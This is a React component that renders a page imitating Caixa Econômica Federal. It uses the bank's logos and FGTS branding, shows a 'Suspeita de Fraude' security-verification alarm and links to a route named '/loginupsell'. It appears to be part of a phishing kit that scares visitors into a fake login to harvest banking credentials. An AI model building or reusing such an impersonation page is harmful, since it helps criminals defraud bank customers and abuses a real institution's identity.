import { useNavigate } from "react-router-dom";
import logo from "../assets/caixalogo.png";
import logofgts from "../assets/fgts2.png";
import caixa from "../assets/caixalogo.png";
import { FaExclamationTriangle } from "react-icons/fa";

export function Travado() {
    const navigate = useNavigate();

    const handleButtonClick = () => {
        navigate("/loginupsell");
    };

    return (
        <>
            <div className="w-screen flex flex-col items-center text-white h-full  bg-[#025bab]">
                {/* Header with logos */}
                <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] ">
                    <div className="flex items-center justify-between w-full">
                        <div className="flex items-center space-x-3">
                            <img width={34} src={logo} alt="logo" />
                            <span className="text-white font-extralight">Caixa Econômica Federal</span>
                        </div>
                        <img src={logofgts} alt="fgts" width={65} />
                    </div>
                </header>

                {/* Main content */}
                <div className="flex flex-col items-center mt-10 px-6 text-center space-y-6">
                    <div className="flex flex-col items-center">
                        <div className="relative flex items-center">
                            <FaExclamationTriangle
                                size={50}
                                className="text-orange-500 absolute top-0 left-0 -translate-x-6 -translate-y-2"
                            />
                            <img src={caixa} alt="caixa" width={120} className="ml-4" />
                        </div>

                        <h2 className="text-3xl font-bold mt-4">Suspeita de Fraude</h2>
                    </div>

                    <h2 className="text-2xl font-bold mt-4 text-red-500 bg-white w-full p-2">VERIFICAÇÃO DE SEGURANÇA!</h2>
                    <p className="text-zinc-300 text-2xl">
                        A Caixa Econômica Federal precisa realizar uma verificação para confirmar que é você que está tentando liberar o FGTS.
                    </p>

                    <p className="text-zinc-400 text-xl">
                        Essa etapa é para sua própria <span className="text-green-500">segurança</span>
                    </p>

                    {/* Button to proceed */}
                    <button
                        onClick={handleButtonClick}
                        className="bg-orange-500 text-white font-semibold py-3 px-8 rounded-full mt-6 hover:bg-orange-600 transition duration-200 w-full"
                    >
                        Realizar Verificação
                    </button>
                </div>

                {/* Footer message */}
                <div className="text-center mt-8 px-4">
                    <p className="text-sm text-zinc-400">
                        Esta verificação é necessária para garantir a segurança dos seus dados e o acesso ao seu saldo.
                    </p>
                </div>


            </div>

        </>
    );
}
